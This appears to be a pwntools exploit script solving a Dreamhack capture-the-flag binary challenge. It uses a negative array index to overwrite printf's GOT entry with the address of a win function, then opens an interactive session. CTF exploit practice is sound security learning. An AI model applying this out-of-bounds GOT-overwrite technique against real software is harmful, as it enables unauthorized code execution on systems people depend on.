from pwn import *

p = process("./quest/deploy/prob")
#p = remote("host3.dreamhack.games", [PORT])
e = ELF("./quest/deploy/prob")

def slog(n, m):
    return success(" : ".join([n, hex(m)]))

buf = 0x404080

slog("[!] win ", e.symbols['win'])
slog("[!] print-got ", e.got['printf'])
slog("[!] buf", buf)

print(f"Distance [buf] - [print_got] = {hex(buf)} - {hex(e.got['printf'])}\n=> {int(buf) - int(e.got['printf'])}")

p.sendlineafter(b"val: ", str(-15))
p.sendlineafter(b"val: ", str(int(e.symbols['win'])))

p.interactive()
